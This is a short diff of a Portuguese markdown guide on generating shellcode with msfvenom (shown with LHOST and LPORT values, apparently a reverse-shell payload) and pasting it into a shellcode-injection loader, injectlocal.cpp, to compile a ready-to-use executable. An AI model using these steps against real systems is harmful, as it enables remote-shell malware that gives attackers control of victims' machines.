@@ -67,18 +67,16 @@ LHOST=192.168.10.113 LPORT=1234 -f c -b \x00\x0a\x0d
 
 #### Step 2
 
-- Abrir o código do link mencionado no inicio, que tem o
-código responsável por executar os bytes gerados acima.
+- Abrir o código do link mencionado no inicio, que tem o código responsável por executar os bytes gerados acima.
 
 
 ```text
 injectlocal.cpp
 ```
 
-- Depois de copiar os bytes gerados pelo msfvenom no Step 1, devemos colar esses bytes no conteúdo da variável 
-_unsigned char shellcode[] = ""_ do código fonte , e depois compilar-lo.
+- Depois de copiar os bytes gerados pelo msfvenom no Step 1, devemos colar esses bytes no conteúdo da variável *unsigned char shellcode[] = ""* do código 'injectlocal.cpp' e depois compilar-lo.
 
-- Ao compilar o software com sucesso teremos os executáveis prontos para uso.
+- Ao compilar o software com sucesso teremos o executável pronto para uso.
 
 
 ```text
